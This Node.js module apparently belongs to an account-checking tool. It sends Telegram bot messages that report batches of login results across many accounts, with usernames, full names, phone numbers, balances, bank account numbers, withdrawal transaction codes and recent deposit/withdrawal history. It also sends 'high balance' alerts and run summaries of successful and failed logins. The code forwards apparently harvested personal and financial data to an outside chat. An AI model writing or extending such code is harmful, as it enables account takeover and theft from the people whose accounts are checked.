const axios = require('axios');
const config = require('../config');

const dataQueue = [];
let dataQueueRunning = false;
let activeDataJob = 0;

const batchBuffer = [];
const BATCH_SIZE = Number(config.telegram.batchSize || 5);

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function shortText(input, max = 60) {
  const text = safeText(input || '-');
  return text.length > max ? `${text.slice(0, max)}...` : text;
}

function formatRecentSlipHistory(items = []) {
  if (!Array.isArray(items) || items.length === 0) {
    return 'Không có';
  }

  return items
    .slice(0, 3)
    .map((item, idx) => {
      return [
        `   ${idx + 1}. ${safeText(item.type || '-')}`,
        `      💸 ${Number(item.amount || 0).toLocaleString('vi-VN')}`,
        `      🏦 ${shortText(item.bankName || '-')}`,
        `      💳 ${safeText(item.bankAccount || '-')}`,
        `      📄 ${shortText(item.status || '-')}`
      ].join('\n');
    })
    .join('\n');
}

async function sendMessage(chatId, text, topicId) {
  if (!config.telegram.botToken || !chatId || !text) {
    console.log('[Telegram] Skipped:', {
      hasToken: !!config.telegram.botToken,
      chatId,
      hasText: !!text
    });
    return { skipped: true };
  }

  const url = `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`;

  try {
    const payload = {
      chat_id: chatId,
      text,
      disable_web_page_preview: true
    };

    if (topicId) {
      payload.message_thread_id = topicId;
    }

    const response = await axios.post(url, payload, { timeout: 15000 });

    console.log('[Telegram] Sent OK:', {
      chatId,
      topicId: topicId || null,
      messageId: response.data?.result?.message_id || null
    });

    return response.data;
  } catch (error) {
    const responseData = error.response?.data;

    if (responseData?.error_code === 429) {
      const retryAfter = Number(responseData?.parameters?.retry_after || 5);
      console.log(`[Telegram] Rate limited. Retry after ${retryAfter}s`);
      await sleep(retryAfter * 1000);
      return sendMessage(chatId, text, topicId);
    }

    console.error('[Telegram] Send failed:', responseData || error.message);
    return null;
  }
}

async function processDataQueue() {
  if (dataQueueRunning) return;
  dataQueueRunning = true;

  try {
    while (dataQueue.length > 0) {
      const job = dataQueue.shift();
      activeDataJob++;

      try {
        await sendMessage(job.chatId, job.text, job.topicId);
      } finally {
        activeDataJob--;
      }

      const delayMs = Number(config.telegram.dataQueueDelayMs || 1200);
      await sleep(delayMs);
    }
  } finally {
    dataQueueRunning = false;
  }
}

function enqueueDataMessage(chatId, text, topicId) {
  dataQueue.push({ chatId, text, topicId });

  console.log(
    `[Telegram Queue] Enqueued | pending=${dataQueue.length} | batchSize=${BATCH_SIZE}`
  );

  processDataQueue().catch((err) => {
    console.error('[Telegram Queue] Unexpected error:', err.message);
  });
}

async function flushBatch() {
  if (!batchBuffer.length) return;

  const batch = batchBuffer.splice(0, BATCH_SIZE);
  const header = `📊 LOGIN RESULT (${batch.length} accounts)`;

  const lines = batch.map((item, i) => {
    const statusEmoji = item.status === 'SUCCESS' ? '✅' : '❌';

    return [
      `${i + 1}️⃣ #${item.index}/${item.total}`,
      `👤 Username: ${safeText(item.username)}`,
      `📛 Name: ${safeText(item.fullname || '-')}`,
      `💰 Balance: ${Number(item.balance || 0).toLocaleString('vi-VN')}`,
      `📱 Phone: ${safeText(item.phone || '-')}`,
      `📄 Status: ${statusEmoji} ${safeText(item.status)}`,
      `📝 Msg: ${shortText(item.message || '-', 80)}`,
      `🏦 Bank rút gần nhất: ${shortText(item.lastSlipBankName || '-')}`,
      `💳 STK rút gần nhất: ${safeText(item.lastSlipBankAccount || '-')}`,
      `💸 Số tiền rút gần nhất: ${Number(item.lastSlipAmount || 0).toLocaleString('vi-VN')}`,
      `📌 Trạng thái rút: ${shortText(item.lastSlipStatus || '-')}`,
      `🔖 Mã GD: ${safeText(item.lastSlipTransactionCode || '-')}`,
      `📚 Lịch sử nạp/rút gần nhất:\n${formatRecentSlipHistory(item.recentSlipHistory)}`,
      '---'
    ].join('\n');
  });

  const text = [header, '', ...lines].join('\n');

  enqueueDataMessage(
    config.telegram.dataChatId,
    text,
    config.telegram.dataTopicId
  );
}

async function flushAllBatches() {
  while (batchBuffer.length > 0) {
    await flushBatch();
  }
}

async function waitForDataQueueDrain() {
  while (dataQueueRunning || dataQueue.length > 0 || activeDataJob > 0) {
    console.log(
      `[Telegram Queue] Waiting... pending=${dataQueue.length} active=${activeDataJob} buffer=${batchBuffer.length}`
    );
    await sleep(1000);
  }

  console.log('[Telegram Queue] Drain complete');
}

function safeText(input) {
  return String(input ?? '')
    .replace(/\r/g, '')
    .trim();
}

async function notifyDataGroup(result, index, total) {
  // const shouldNotify =
  //   result.status === 'SUCCESS'
  //     ? config.telegram.notifySuccess
  //     : config.telegram.notifyFailure;

  // if (!shouldNotify) return;

  // batchBuffer.push({
  //   username: result.username,
  //   fullname: result.fullname || '-',
  //   phone: result.phone || '-',
  //   message: result.message || '-',
  //   balance: Number(result.balance || 0),
  //   status: result.status,
  //   index,
  //   total,

  //   lastSlipBankName: result.lastSlipBankName || '-',
  //   lastSlipBankAccount: result.lastSlipBankAccount || '-',
  //   lastSlipAmount: Number(result.lastSlipAmount || 0),
  //   lastSlipStatus: result.lastSlipStatus || '-',
  //   lastSlipTransactionCode: result.lastSlipTransactionCode || '-',
  //   recentSlipHistory: result.recentSlipHistory || []
  // });

  // console.log(
  //   `[Telegram Batch] Buffered ${result.username} | buffer=${batchBuffer.length}/${BATCH_SIZE}`
  // );

  // if (batchBuffer.length >= BATCH_SIZE) {
  //   await flushBatch();
  // }
}

async function notifyHighBalance(result) {
  const text = [
    'HIGH BALANCE ALERT',
    `Username: ${safeText(result.username)}`,
    `Nickname: ${safeText(result.nickname || '-')}`,
    `Balance: ${Number(result.balance || 0).toLocaleString('vi-VN')}`,
    `Fullname: ${safeText(result.fullname || '-')}`,
    `Message: ${safeText(result.message || '-')}`
  ].join('\n');

  console.log('>>>> notifyHighBalance');
  console.log(text);

  await sendMessage(
    config.telegram.highBalanceChatId,
    text,
    config.telegram.highBalanceTopicId
  );
}

async function notifyRunSummary(summary) {
  const text = [
    'RUN SUMMARY',
    `Run: ${safeText(summary.runName || '-')}`,
    `Total: ${summary.totalAccounts}`,
    `Success: ${summary.successCount}`,
    `Failed: ${summary.failedCount}`,
    `High balance: ${summary.highBalanceCount}`,
    `Threshold: ${Number(summary.threshold).toLocaleString('vi-VN')}`,
    `Duration: ${summary.durationMs} ms`
  ].join('\n');

  console.log('>>>> notifyRunSummary');
  console.log(text);

  await sendMessage(
    config.telegram.summaryChatId,
    text,
    config.telegram.summaryTopicId
  );
}

module.exports = {
  notifyDataGroup,
  notifyHighBalance,
  notifyRunSummary,
  flushAllBatches,
  waitForDataQueueDrain
};